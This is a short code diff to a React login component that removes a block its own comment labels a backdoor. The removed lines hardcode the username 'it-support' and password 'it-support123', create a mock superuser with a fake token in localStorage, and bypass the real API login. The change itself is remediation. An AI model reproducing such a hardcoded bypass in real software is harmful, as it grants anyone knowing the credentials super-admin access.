@@ -23,24 +23,6 @@ export default function Login() {
     setError('');
     setLoading(true);
 
-    // ── IT Support Maxsus Login (Backdoor) ──
-    if (username === 'it-support' && password === 'it-support123') {
-      const mockUser = {
-        id: 999,
-        username: 'it_support_admin',
-        first_name: 'IT Support',
-        last_name: 'Super Admin',
-        role: 'it_support',
-        is_superuser: true
-      };
-      localStorage.setItem('access_token', 'mock_it_support_token');
-      localStorage.setItem('user', JSON.stringify(mockUser));
-      localStorage.setItem('login_time', Date.now().toString());
-      setLoading(false);
-      navigate('/it-support');
-      return;
-    }
-
     try {
       const res = await api.login(username, password);
       if (!res.user) {
